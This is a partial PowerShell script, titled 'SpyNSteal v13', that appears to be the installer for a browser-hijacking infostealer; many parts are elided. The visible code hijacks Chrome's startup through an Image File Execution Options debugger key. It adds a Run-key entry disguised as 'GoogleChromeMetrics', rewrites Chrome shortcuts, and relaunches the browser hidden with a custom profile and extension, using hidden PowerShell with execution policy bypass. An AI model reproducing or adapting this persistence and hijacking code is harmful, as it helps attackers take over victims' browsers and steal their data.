# SpyNSteal v13 - Permanent profile junction + pipe CDP + launcher hijack
...
function Get-ChromeArgList([string]$profileDir, [string]$extDir) {
    return @(
...
function Write-ChromeLauncher([string]$chromeExe, [string]$profileDir, [string]$extDir) {
...
"@
    ...
    $batContent = "@echo off`r`npowershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$psPath`"`r`nexit /b 0`r`n"
...
function Install-ChromeIFEO([string]$launcherBat) {
    try {
        $key = "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe"
        New-Item -Path $key -Force | Out-Null
        Set-ItemProperty -Path $key -Name "Debugger" -Value $launcherBat -Type String -Force
        Log "IFEO Debugger hook set for chrome.exe"
        return $true
    } catch {
        Log "IFEO failed: $_"
        return $false
...
function Install-ChromeLaunchHooks([string]$chromeExe, [string]$launcherBat) {
    $patched = 0
    if (Install-ChromeIFEO $launcherBat) { $patched++ }

    $runName = "GoogleChromeMetrics"
    try {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runName -Value "`"$launcherBat`"" -Force
        Log "Run key -> launcher bat"
        $patched++
    ...
    foreach ($lnkPath in $shortcutTargets) {
        try {
            if ($lnkPath -like "*\Google Chrome.lnk" -and -not (Test-Path $lnkPath)) {
...
$launcherBat = Write-ChromeLauncher $target.ExePath $profileDir $extDirAbs
Log "Launcher: $launcherBat"

$hookCount = Install-ChromeLaunchHooks $target.ExePath $launcherBat
Log "Launch hooks installed: $hookCount"

Patch-LocalState $profileDir
Start-Sleep 1

Log "Relaunching Chrome via launch.ps1..."
$launchPs1 = Join-Path (Join-Path $env:APPDATA "CRSched") "launch.ps1"
if (Test-Path $launchPs1) {
    Start-Process -FilePath "powershell.exe" -ArgumentList @(
        "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", $launchPs1
    ) -WindowStyle Hidden
} else {
    Start-Process -FilePath $launcherBat -WindowStyle Hidden
}

Log "=== Done (extId=$extId, inPrefs=$inPrefs, copied=$copied, profileDir=$profileDir, hooks=$hookCount) ==="
